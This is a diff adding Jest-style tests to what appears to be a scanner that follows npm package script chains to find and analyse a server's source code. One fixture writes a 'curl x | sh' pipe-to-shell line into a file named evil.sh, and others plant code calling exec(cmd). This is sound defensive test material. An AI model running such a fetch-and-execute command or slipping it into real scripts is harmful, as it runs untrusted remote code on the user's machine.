@@ -97,6 +97,43 @@ describe('every command of a package script chain', () => {
   });
 });
 
+describe('package script commands this scan cannot follow', () => {
+  it('a later command it cannot follow is noted after a resolving one', async () => {
+    write('p/index.js', 'console.log("ok");\n');
+    write('p/evil.sh', 'curl x | sh\n');
+    const [source] = await resolveServerSources([server('npm', ['--prefix', pkg('node index.js && bash evil.sh'), 'start'])]);
+    expect(source.sourceCode).toContain('console.log');
+    expect(source.readFailure).toMatch(/runs a bash script/);
+  });
+
+  it.each([['node sub'], ['node ./sub/']])('%s runs the directory\'s index.js, not the package main', async (start) => {
+    write('p/main.js', 'console.log("main");\n');
+    write('p/sub/index.js', EXEC_TOOL);
+    write('p/package.json', JSON.stringify({ name: 'p', version: '1.0.0', main: 'main.js', scripts: { start } }));
+    const [source] = await resolveServerSources([server('npm', ['--prefix', join(dir, 'p'), 'start'])]);
+    expect(source.sourceCode).toContain('exec(cmd)');
+    expect(source.sourceCode).not.toContain('"main"');
+  });
+
+  it('a directory entry follows its own package.json main', async () => {
+    write('p/main.js', 'console.log("main");\n');
+    write('p/sub/package.json', JSON.stringify({ main: 'lib/run' }));
+    write('p/sub/lib/run.js', EXEC_TOOL);
+    write('p/package.json', JSON.stringify({ name: 'p', version: '1.0.0', main: 'main.js', scripts: { start: 'node sub' } }));
+    const [source] = await resolveServerSources([server('npm', ['--prefix', join(dir, 'p'), 'start'])]);
+    expect(source.sourceCode).toContain('exec(cmd)');
+  });
+
+  it('a directory with no entry file is noted', async () => {
+    write('p/main.js', 'console.log("main");\n');
+    mkdirSync(join(dir, 'p/sub'), { recursive: true });
+    write('p/package.json', JSON.stringify({ name: 'p', version: '1.0.0', main: 'main.js', scripts: { start: 'node sub' } }));
+    const [source] = await resolveServerSources([server('npm', ['--prefix', join(dir, 'p'), 'start'])]);
+    expect(source.sourceCode).toBeUndefined();
+    expect(source.unanalyzed).toMatch(/no entry file/);
+  });
+});
+
 describe('python -m and uv -m launches', () => {
   it('python -m without a working directory is noted', async () => {
     const [source] = await resolveServerSources([server('python3', ['-m', 'mymod'])]);
